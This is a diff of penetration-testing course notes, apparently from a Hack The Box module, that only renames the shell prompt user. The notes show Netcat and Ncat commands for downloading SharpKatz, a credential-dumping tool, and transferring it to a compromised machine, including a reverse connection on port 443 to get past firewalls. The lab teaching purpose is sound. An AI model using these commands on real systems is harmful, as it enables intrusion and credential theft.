@@ -83,10 +83,10 @@ victim@target:~$ nc -l -p 8000 > SharpKatz.exe
 From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file SharpKatz.exe as input to Netcat. The option -q 0 will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.
 #### Netcat - Attack Host - Sending File to Compromised machine
 ```
-d0x777@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+w1j0y@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
 ```
 ```
-d0x777@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+w1j0y@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
 ```
 #### Ncat - Compromised Machine - Listening on Port 8000
 ```
@@ -95,15 +95,15 @@ victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
 By utilizing Ncat on our attacking host, we can opt for --send-only rather than -q. The --send-only flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. 
 #### Ncat - Attack Host - Sending File to Compromised machine
 ```
-d0x777@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+w1j0y@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
 ```
 ```
-d0x777@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+w1j0y@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
 ```
 Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file SharpKatz.exe as input to Netcat.
 #### Attack Host - Sending File as Input to Netcat
 ```
-d0x777@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
+w1j0y@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
 ```
 #### Compromised Machine Connect to Netcat to Receive the File
 ```
@@ -111,7 +111,7 @@ victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
 ```
 #### Attack Host - Sending File as Input to Ncat
 ```
-d0x777@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
+w1j0y@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
 ```
 #### Compromised Machine Connect to Ncat to Receive the File
 ```
